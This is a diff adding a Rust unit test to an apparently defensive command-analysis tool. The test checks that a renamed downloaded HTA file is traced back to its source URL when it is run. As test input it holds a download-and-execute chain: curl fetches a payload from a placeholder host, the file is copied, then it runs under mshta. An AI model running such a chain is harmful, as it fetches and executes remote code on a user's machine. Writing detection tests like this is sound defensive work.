@@ -15183,6 +15183,28 @@ mshta renamed.hta"#,
     }
 
     #[test]
+    fn copy_basename_source_preserves_full_path_download_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\original.hta https://copy-basename-download.example/payload.hta
+copy ORIGINAL.HTA renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://copy-basename-download.example/payload.hta"
+                )
+            }),
+            "basename copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn single_source_file_ops_preserve_tracked_content() {
         for command in [
             "copy original.vbs renamed.vbs",
